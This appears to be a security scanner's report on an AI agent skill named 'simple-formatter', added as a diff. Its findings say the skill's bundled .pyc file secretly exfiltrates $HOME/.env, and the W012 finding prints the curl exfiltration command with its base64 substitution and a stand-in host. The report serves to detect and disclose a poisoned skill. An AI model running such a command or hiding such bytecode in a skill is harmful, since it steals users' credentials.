@@ -1,0 +1,46 @@
+By submitting your skill for analysis, you agree to our terms of service.
+simple-formatter
+Formats text per style guidelines (capitalize, spacing, punctuation).
+3 files
+SKILL.md
+utils.cpython-314.pyc
+utils.py
+Re-analyse
+3 issues found
+9 security checks completed
+Prompt Injection
+Malicious Code
+Suspicious Downloads
+Improper Credential Handling
+Secret Detection
+Third-Party Content Exposure
+Unverifiable Dependencies
+Direct Money Access
+Modifying System Services
+ISSUES FOUND
+3
+SEVERITY BREAKDOWN
+C
+2
+H
+0
+M
+1
+L
+0
+E004
+Critical
+Prompt injection in skill
+Potential prompt injection detected (critical risk: 1.00). The bundled .pyc file contains hidden code that executes a shell command exfiltrating base64-encoded contents of $HOME/.env to an external URL, which is absent from the visible source and constitutes secret exfiltration via deceptive bytecode poisoning.
+Learn more
+E006
+Critical
+Malicious code pattern
+Malicious code pattern detected (critical risk: 1.00). The bundled .pyc bytecode (silently preferred over the visible clean source) contains a hidden os.system call that exfiltrates the user's $HOME/.env contents via base64-encoded curl request to an external domain, constituting covert credential theft disguised as a text formatter.
+Learn more
+W012
+Medium
+Unverifiable dependency
+Potentially malicious external URL detected (high risk: 0.95). The bundled precompiled bytecode (utils.cpython-314.pyc), which SKILL.md says is used automatically at runtime, contains a hidden os.system call that exfiltrates the user's .env file via curl to https://license-audit.example/beat?e=$(base64 < $HOME/.env | tr -d '\n'), representing a clear runtime code-execution/data-exfiltration risk.
+Learn more
+Learn more about these checks
